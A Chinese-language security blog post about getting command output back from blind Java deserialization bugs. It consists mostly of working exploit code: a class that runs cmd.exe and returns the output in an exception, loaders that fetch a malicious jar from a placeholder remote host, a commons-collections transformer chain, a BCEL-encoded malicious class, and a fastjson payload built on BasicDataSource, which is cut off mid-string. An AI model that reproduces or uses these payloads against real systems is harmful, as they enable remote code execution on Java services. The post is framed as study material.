<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>JAVA反序列化回显学习 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="JAVA反序列化回显学习"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>JAVA反序列化回显学习</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/12/17/JAVA反序列化回显学习/" rel="bookmark">
        <time class="entry-date published" datetime="2020-12-17T07:59:04.000Z">
          2020-12-17
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">近年来出现的很多JAVA的漏洞都是无回显的漏洞，因此了解如何能让本身不回显的漏洞回显成为很多大佬研究的内容，本文将带着大家一起学习JAVA反序列化漏洞的回显方案。</span><br></pre></td></tr></table></figure>

<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>​        defineClass可以将byte[]转换为Class类，如下所示defineClass会接收我们传入的name,byte[],长度等参数，最终会返回给我们一个Class类的对象。</p>
<a id="more"></a>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217174607641.png" alt="image-20201217174607641"></p>
<p>​        也就是说我们不仅可以通过ClassLoader.loadClass（）来获取Class类，也可以将一个类转化为byte[],通过defineClass我们就可以获取到这个类。</p>
<p>​        我这里写了个测试代码来帮助理解，首先我们创建一个test666类，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test666 &#123;</span><br><span class="line">    public test666(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader &#x3D; new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D; new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer &#x3D; new StringBuffer();</span><br><span class="line">        String line &#x3D; null;</span><br><span class="line"></span><br><span class="line">        while((line &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        可以看到在我们的有参构造方法中，接收了cmd参数放到ProcessBuilder中执行将执行的结果通过exception异常来回显出来，我们将test666这个类编译，再编写一个类去将test666.class中的内容读取并存入到字节数组中，通过defineClass来获取test666这个类的Class对象，再通过newInstance来调用它的构造方法并传入参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">public class defineClassTest extends  ClassLoader&#123;</span><br><span class="line">    public static &lt;defineClass&gt; void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        File file&#x3D;new File(&quot;C:\\Users\\admin\\Desktop\\test666.class&quot;);</span><br><span class="line">        BufferedInputStream bis &#x3D; null;</span><br><span class="line">        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">        bis &#x3D; new BufferedInputStream(in);</span><br><span class="line">        byte[] buf &#x3D; new byte[1024];</span><br><span class="line">        int len &#x3D; 0;</span><br><span class="line">        while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">            baos.write(buf, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] buffer &#x3D; baos.toByteArray();</span><br><span class="line">        defineClassTest defineclasstest &#x3D; new defineClassTest();</span><br><span class="line">        Class cls &#x3D; defineclasstest.defineClass(&quot;test666&quot;,buffer,0,buffer.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行结果如下，可以看到我们已经将命令执行的结果打印出了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217200921594.png" alt="image-20201217200921594"></p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>​        我们也可以使用URLClassLoader来加载远程的恶意类执行命令并获取回显,首先将我们生成的恶意类打包并放置到远程服务器上。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218101624866.png" alt="image-20201218101624866"></p>
<p>​        编写如下代码通过URLClassLoader加载远程的jar包执行命令并获取回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class urlget &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            URLClassLoader loader&#x3D;new URLClassLoader(new URL[]&#123;new URL(&quot;http:&#x2F;&#x2F;xxx:88&#x2F;test666.jar&quot;)&#125;);</span><br><span class="line">            Class cls &#x3D; loader.loadClass(&quot;test666&quot;);</span><br><span class="line">            cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103236476.png" alt="image-20201218103236476"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103258089.png" alt="image-20201218103258089"></p>
<p>​        URLClassLoader回显方案在commons-collections利用链下的利用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class commonsTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(</span><br><span class="line">                                &quot;http:&#x2F;&#x2F;xxxxx:88&#x2F;test666.jar&quot;) &#125; &#125; &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;test666&quot; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; String.class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new String[] &#123; &quot;ipconfig&quot; &#125; &#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;创建Map并绑定transformerChain</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;触发漏洞</span><br><span class="line">        Map.Entry onlyElement &#x3D; (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218105916926.png" alt="image-20201218105916926"></p>
<h3 id="fastjson回显"><a href="#fastjson回显" class="headerlink" title="fastjson回显"></a>fastjson回显</h3><p>​        在fastjson的回显利用方案中，需要将我们的恶意类经过BCEL编码后传入，经过查阅资料fastjson回显的利用方案最终是因为调用了forName方法，而forName在调用的过程中会去执行static静态代码块，所以我们需要将我们的利用代码写在静态代码块中,由于在静态代码块中调用了方法，所以被调用的方法也要用static来修饰。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test888 &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            exec(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void exec(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader&#x3D;new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D;new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer&#x3D;new StringBuffer();</span><br><span class="line">        String line&#x3D;null;</span><br><span class="line">        while((line&#x3D;bufferedReader.readLine())!&#x3D;null)&#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        throw  new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译上面的代码，我们可以获取到test888.class这个类，下面我们将这个类进行处理，转换为BCEL编码，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        Path path &#x3D; Paths.get(&quot;C:\\Users\\admin\\xxx\\test888.class&quot;);   &#x2F;&#x2F;文件绝对路径</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(path);</span><br><span class="line">        String s &#x3D;  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218115406847.png" alt="image-20201218115406847"></p>
<p>​        我们可以编写如下代码测试能否利用<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载我们的恶意类执行命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class pwn &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        String classname&#x3D;&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$Ad&quot;;</span><br><span class="line">        ClassLoader cls&#x3D;new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        Class.forName(classname,true,cls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218134951663.png" alt="image-20201218134951663"></p>
<p>​        简单分析一下com.sun.org.apache.bcel.internal.util.ClassLoader的forName方法是如何执行的。</p>
<p>​        跟进forName方法，首先获取SecurityManager实例，获取实例为空后会调用forName0这个方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140341587.png" alt="image-20201218140341587"></p>
<p>​        但是forName0是native层的代码，所以获取不到具体的执行细节。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140555599.png" alt="image-20201218140555599"></p>
<p>​        但继续跟进会调用java.lang.ClassLoader.loadClass方法</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140645454.png" alt="image-20201218140645454"></p>
<p>​        继续跟进调用，首先尝试通过class_name获取Class实例，这里没有获取到</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140742726.png" alt="image-20201218140742726"></p>
<p>​        当没有获取到Class实例，会查看class_name中是否包含<code>$$BCEL$$</code>,如果包含会执行createClass方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140906671.png" alt="image-20201218140906671"></p>
<p>​        在createClass中会以<code>$$BCEL$$</code>进行分割，取出real_name，将real_name中的内容解码成bytes形式，并获取ClassParser解析器，解析出test888这个类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141015072.png" alt="image-20201218141015072"></p>
<p>​        获取Class后通过defineClass来加载类，执行类中的static方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218141528766.png" alt="image-20201218141528766"></p>
<p>​            使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>配合回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">        &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b